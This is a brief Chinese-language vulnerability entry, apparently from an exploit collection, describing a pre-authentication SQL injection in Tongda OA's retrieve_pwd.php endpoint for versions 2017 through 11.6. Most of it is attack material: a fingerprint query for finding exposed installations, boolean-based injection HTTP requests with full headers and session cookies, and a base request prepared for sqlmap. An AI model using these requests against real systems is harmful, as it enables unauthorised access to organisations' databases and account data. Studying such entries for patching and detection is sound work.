# 通达OAretrieve_pwd存在前台SQL注入漏洞

- **系统**：通达OA　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app.name="通达 OA"`
- **请求**：`GET /ispirit/retrieve_pwd.php?_GET[username]=admin%27+and+%271%27%3D%271+ HTTP/1.1`
- **关键头**：`Host: 192.168.31.164`　`Cookie: USER_NAME_COOKIE=admin; SID_1=2b4980ea; PHPSESSID=pshu97gqch67779m3q1i048tg0; KE…`

**请求体 / payload**
```
GET /ispirit/retrieve_pwd.php?_GET[username]=admin%27+and+%271%27%3D%272+ HTTP/1.1
Host: 192.168.31.164
Cookie: USER_NAME_COOKIE=admin; SID_1=2b4980ea; PHPSESSID=pshu97gqch67779m3q1i048tg0; KEY_RANDOMDATA=14077

sqlmap
GET /ispirit/retrieve_pwd.php?_GET[username]=admin HTTP/1.1
Host: 192.168.31.164
Cookie: USER_NAME_COOKIE=admin; SID_1=2b4980ea; PHPSESSID=pshu97gqch67779m3q1i048tg0; KEY_RANDOMDATA=14077
```

**其他**
- 通达OA retrieve\_pwd存在前台SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 通达OA2017-通达OA11	.6